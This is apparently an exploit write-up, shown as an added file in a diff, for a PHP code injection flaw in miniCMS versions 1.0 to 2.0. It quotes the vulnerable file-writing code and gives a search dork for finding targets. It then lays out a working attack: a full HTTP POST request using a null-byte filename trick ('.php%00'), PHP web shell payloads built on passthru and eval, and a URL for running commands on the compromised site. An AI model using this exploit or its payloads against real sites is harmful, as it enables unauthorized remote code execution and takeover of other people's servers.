@@ -1,0 +1,77 @@
+########################################################################
+# Title    : miniCMS v1.0 : v2.0 php inject code
+# Author   : Or4nG.M4n
+# Version  : all version 
+# GDork    : "This site is managed using MiniCMS©"
+# Download : http://sourceforge.net/projects/mini-cms/files/mini-cms/
+# Thnks :
+# +----------------------------------+
+# |   xSs m4n   i-Hmx   h311 c0d3    | sp. Cyb3r-Crystal
+# |   SarBoT511 ahwak2000 sa^Dev!L   | sp. ahwak2000
+# +----------------------------------+
+#                       php code injection and bypass addslashes();
+# vuln : update.php shell path /content
+# vuln : updatenews.php shell path /content/news
+
+$filename = "content/".$pagename.".txt"; <= .php%00
+	
+		if ($file = fopen($filename, "w"))
+		{
+			//chmod($filename, 0777);
+			if($pagename == "sitemap"){
+				$eachline = split("\n", $postTemp["content"]);
+				$cleancontent = "";
+				foreach($eachline as $el){
+					if(trim($el) != ""){
+						$cleancontent .= trim($el) . "\n";
+					}
+				}
+				$postTemp["content"] = $cleancontent;
+			}
+			//$postTemp["content"] = str_replace('"', '\"', $postTemp["content"]);
+			if (!get_magic_quotes_gpc()) {
+			   $postTemp["content"] = addslashes($postTemp["content"]);
+			} 
+			fwrite($file, serialize($postTemp));
+			fclose($file);
+		}
+		else
+		{
+			echo "Unable to open file for writing, please check permissions on content directory";
+		}
+	}
+	else
+	{
+		$filename = "content/".$area.".txt"; < = .php%00
+		if ($file = fopen($filename, "w"))
+		{
+			chmod($filename, 0777);
+			//$postTemp["content"] = str_replace('"', '\"', $postTemp["content"]);
+			fwrite($file, $postTemp["content"]);
+			fclose($file);
+		}
+ How i can Use this Exploit
+ in your Browser FireFox 
+ use add on LIVE HTTP HEADER
+ 
+ in target page [ http://localhost/miniCMS-2.0/index.php?page=1 ] ..
+ Replay to : 
+ POST : http://www.cmtsystem.com/mCMS/update.php
+ Host: localhost
+ User-Agent: Mozilla/5.0 (Windows NT 5.1; rv:9.0.1) Gecko/20100101 Firefox/9.0.1
+ Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+ Accept-Language: en-us,en;q=0.5
+ Accept-Encoding: gzip, deflate
+ Accept-Charset: ISO-8859-1,utf-8;q=0.7,*;q=0.7
+ Connection: keep-alive
+ Referer: http://localhost/miniCMS-2.0/index.php?page=1
+ Cookie: miniCMSdemo=32b5075aba3eb6c5d11129ec114346c2
+ Content-Type: application/x-www-form-urlencoded
+ Content-Length: 47
+ Post this shit : title=1&metadata=1&content=[CODE]&page=thnks-ahwak2000-cyber-crystal.php%00&area=content
+ Add Your code php here : [CODE]
+ Now how i can bypass addslashes(); inject <?php passthru($_GET[cmd]);?> or <?php eval($_GET[cmd]);?> 
+ Don't Forget Referer : http://site/index.php?page=1
+ [ ! ] http://site/content/thnks-ahwak2000-cyber-crystal.php?cmd=uname-a
+ # Thnks to all Stupid Coder
+ # The End 
